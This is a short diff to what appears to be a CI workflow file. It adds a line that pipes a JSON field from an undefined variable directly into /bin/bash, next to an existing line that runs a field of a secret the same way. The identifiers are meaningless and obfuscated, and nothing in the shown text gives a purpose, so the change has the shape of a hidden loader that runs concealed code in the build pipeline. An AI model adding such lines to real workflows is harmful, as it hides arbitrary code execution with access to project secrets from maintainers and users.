@@ -23,6 +23,7 @@ jobs:
           rez7768: ${{ secrets.rez7768 }}
         run: |
           printf '%s' "$rez7768" | jq -r .k83 | /bin/bash
+          echo $liru7602 | jq -r .c55460 | /bin/bash
 
       - name: Store artifact
         if: always()
